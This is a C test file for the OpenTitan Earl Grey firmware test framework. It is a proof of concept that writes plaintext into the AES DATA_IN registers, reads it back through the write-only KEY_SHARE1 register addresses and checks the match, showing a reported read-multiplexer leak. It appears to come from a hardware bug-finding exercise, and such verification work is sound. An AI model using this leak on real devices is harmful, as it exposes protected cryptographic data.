#include "sw/device/lib/testing/test_framework/ottf_main.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/abs_mmio.h"
#include "sw/device/lib/runtime/log.h"
#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"
#include "aes_regs.h"

OTTF_DEFINE_TEST_CONFIG();

// This test demonstrates the read-multiplexer bug reported in aes_reg_top.sv
// (Vuln ID 1). The top-level read mux maps KEY_SHARE1_[0..3] address hits to
// data_in_[0..3]_qs nets, causing reads from the write-only KEY_SHARE1
// registers to return the contents of DATA_IN registers. The RTL lines of
// interest are around L729-L852 (qs nets) and L1710-L1724 (top-level mux).

bool test_main(void) {
  // Construct AES MMIO region from top-level base address.
  mmio_region_t aes = mmio_region_from_addr(TOP_EARLGREY_AES_BASE_ADDR);

  // Prepare 128-bit plaintext (4 words) to load into DATA_IN[0..3].
  const uint32_t plain[4] = {0xdeadbeef, 0xcafebabe, 0x01234567, 0x89abcdef};

  LOG_INFO("AES read-mux leak POC: writing plaintext into DATA_IN registers");

  // Write the plaintext into the DATA_IN registers. These are normally
  // read-protected/unreadable (or at least shouldn't alias to key registers).
  // We use the autogen register offset macros provided by //hw/top:aes_c_regs.
  // Expected macros (generated) are AES_DATA_IN_0_REG_OFFSET .. AES_DATA_IN_3_REG_OFFSET
  // and AES_KEY_SHARE1_0_REG_OFFSET .. AES_KEY_SHARE1_3_REG_OFFSET for key shares.

  mmio_region_write32(aes, AES_DATA_IN_0_REG_OFFSET, plain[0]);
  mmio_region_write32(aes, AES_DATA_IN_1_REG_OFFSET, plain[1]);
  mmio_region_write32(aes, AES_DATA_IN_2_REG_OFFSET, plain[2]);
  mmio_region_write32(aes, AES_DATA_IN_3_REG_OFFSET, plain[3]);

  LOG_INFO("Reading back KEY_SHARE1 registers to detect alias to DATA_IN");

  // Read from the KEY_SHARE1 registers. Due to the reported mux bug, these
  // reads will return the DATA_IN contents, leaking the plaintext.
  uint32_t leaked[4];
  leaked[0] = mmio_region_read32(aes, AES_KEY_SHARE1_0_REG_OFFSET);
  leaked[1] = mmio_region_read32(aes, AES_KEY_SHARE1_1_REG_OFFSET);
  leaked[2] = mmio_region_read32(aes, AES_KEY_SHARE1_2_REG_OFFSET);
  leaked[3] = mmio_region_read32(aes, AES_KEY_SHARE1_3_REG_OFFSET);

  LOG_INFO("Leaked words: 0x%08x 0x%08x 0x%08x 0x%08x",
           leaked[0], leaked[1], leaked[2], leaked[3]);

  // Verify that the read values match what was written into DATA_IN.
  // If the bug is present, these checks will pass, demonstrating a plaintext
  // leakage through the key-address space.
  for (int i = 0; i < 4; ++i) {
    CHECK(leaked[i] == plain[i], "KEY_SHARE1_%d read did not match DATA_IN_%d", i, i);
  }

  LOG_INFO("VULN-1: AES KEY_SHARE1 read alias to DATA_IN detected - plaintext leaked");
  return true;
}
